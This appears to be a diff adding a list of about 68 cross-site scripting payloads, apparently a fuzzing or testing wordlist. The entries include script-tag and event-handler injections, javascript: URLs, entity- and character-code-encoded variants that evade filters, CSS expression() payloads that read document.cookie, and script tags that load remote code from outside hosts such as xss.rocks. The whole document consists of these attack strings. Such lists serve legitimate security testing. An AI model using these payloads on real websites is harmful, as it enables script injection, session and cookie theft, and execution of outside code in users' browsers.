@@ -1,0 +1,68 @@
+String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 49, 41, 60, 47, 115, 99, 114, 105, 112, 116, 62)
+<script>alert(1);</script>
+<script>alert('XSS');</script>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert('XSS')>
+<scr<script>ipt>alert('XSS');</scr</script>ipt>
+'><script>alert(0)</script>
+<img src=foo.png onerror=alert(/xssed/) />
+<style>@import'jaasc
+ipt:alert("XSS")';</style>
+<? echo('<scr)'; echo('ipt>alert("XSS")</script>'); ?>
+<marquee><script>alert('XSS')</script></marquee>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<script src=http://yoursite.com/your_files.js></script>
+</title><script>alert(/xss/)</script>
+</textarea><script>alert(/xss/)</script>
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">
+<font style='color:expression(alert(document.cookie))'>
+<script language=JavaScript>alert('XSS')</script>
+<font style='color:expression(alert(document.cookie))'>
+<body onunload=javascript:alert('XSS');>
+<body onLoad='alert('XSS');'
+[color=red' onmouseover='alert('xss')']mouse over[/color]
+'/></a></><img src=1.gif onerror=alert(1)>
+window.alert('Bonjour !');
+<div style='x:expression((window.r==1)?'':eval('r=1;
+<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
+'>><marquee><h1>XSS</h1></marquee>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<meta http-equiv="refresh" content="0; URL='www.google.com' />
+'><svg onload=alert(document.domain)>'@x.y
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</xmp><script>alert(1)</script>\
+"autofocus onfocus="alert(1)
+"autofocus onfocus=alert(1)//
+"onbeforescriptexecute=alert(1)//
+"onmouseover="alert(1)// (Interaction)
+"autofocus onblur="alert(1)(Interaction)
+autofocus onfocus='alert(1)
+'autofocus onfocus=alert(1)//
+'onbeforescriptexecute=alert(1)//
+'onmouseover='alert(1)// (Interaction)
+'autofocus onblur='alert(1) (Interaction)
+aaaa autofocus onfocus=alert(1)//
+aaaa onbeforescriptexecute=alert(1)//
+aaaa onmouseover=alert(1)//
+javascript:alert(1)//
+";alert(1)//
+"-alert(1)-"
+"+alert(1)+"
+"*alert(1)*"
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=java\0script:alert(\"XSS\")>
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT\s" != "<SCRIPT/XSS\s
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+<IMG SRC="javascript:alert('XSS')"
+foo&apos;; alert(1);//
